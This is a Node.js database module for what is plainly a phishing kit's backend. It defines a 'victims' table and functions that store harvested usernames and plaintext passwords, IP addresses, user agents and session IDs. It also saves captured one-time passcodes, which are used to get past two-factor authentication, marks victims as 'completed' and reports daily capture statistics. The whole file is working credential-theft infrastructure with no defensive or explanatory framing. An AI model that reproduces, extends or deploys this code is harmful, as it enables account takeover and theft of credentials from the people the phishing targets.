const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const crypto = require('crypto');
const logger = require('./logger');

const DB_PATH = path.join(__dirname, '../database/victims.db');

class Database {
  constructor() {
    this.db = new sqlite3.Database(DB_PATH, (err) => {
      if (err) {
        logger.error(`Database connection error: ${err.message}`);
        process.exit(1);
      }
      logger.info('Connected to SQLite database');
      this.initialize();
    });
  }

  initialize() {
    this.db.run(`
      CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip TEXT,
        user_agent TEXT,
        session_id TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        otp TEXT,
        otp_timestamp DATETIME,
        completed BOOLEAN DEFAULT 0,
        encrypted_data TEXT
      )
    `);

    this.db.run(`
      CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT,
        details TEXT,
        ip TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    logger.info('Database tables created/verified');
  }

  encryptData(data) {
    const algorithm = 'aes-256-cbc';
    const key = crypto.scryptSync(process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return `${iv.toString('hex')}:${encrypted}`;
  }

  decryptData(encryptedData) {
    const [ivHex, encrypted] = encryptedData.split(':');
    const iv = Buffer.from(ivHex, 'hex');
    const key = crypto.scryptSync(process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
  }

  saveCredentials(data) {
    return new Promise((resolve, reject) => {
      const encrypted = this.encryptData({
        username: data.username,
        password: data.password
      });

      const query = `
        INSERT INTO victims 
        (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `;

      this.db.run(query, [
        data.username,
        data.password,
        data.ip,
        data.userAgent,
        data.sessionId,
        data.timestamp,
        encrypted
      ], function(err) {
        if (err) {
          logger.error(`Save credentials error: ${err.message}`);
          reject(err);
        } else {
          logger.info(`Credentials saved with ID: ${this.lastID}`);
          resolve(this.lastID);
        }
      });
    });
  }

  saveOTP(data) {
    return new Promise((resolve, reject) => {
      const query = `
        UPDATE victims 
        SET otp = ?, otp_timestamp = ?
        WHERE id = ?
      `;

      this.db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
        if (err) {
          logger.error(`Save OTP error: ${err.message}`);
          reject(err);
        } else {
          logger.info(`OTP saved for user ID: ${data.userId}`);
          resolve();
        }
      });
    });
  }

  markComplete(userId) {
    return new Promise((resolve, reject) => {
      const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
      this.db.run(query, [userId], function(err) {
        if (err) {
          logger.error(`Mark complete error: ${err.message}`);
          reject(err);
        } else {
          resolve();
        }
      });
    });
  }

  getStats() {
    return new Promise((resolve, reject) => {
      const query = `
        SELECT 
          COUNT(*) as total,
          SUM(completed) as completed,
          DATE(timestamp) as date
        FROM victims
        GROUP BY DATE(timestamp)
        ORDER BY DATE(timestamp) DESC
        LIMIT 7
      `;

      this.db.all(query, (err, rows) => {
        if (err) {
          reject(err);
        } else {
          resolve(rows);
        }
      });
    });
  }

  close() {
    this.db.close((err) => {
      if (err) {
        logger.error(`Database close error: ${err.message}`);
      } else {
        logger.info('Database connection closed');
      }
    });
  }
}

module.exports = new Database();
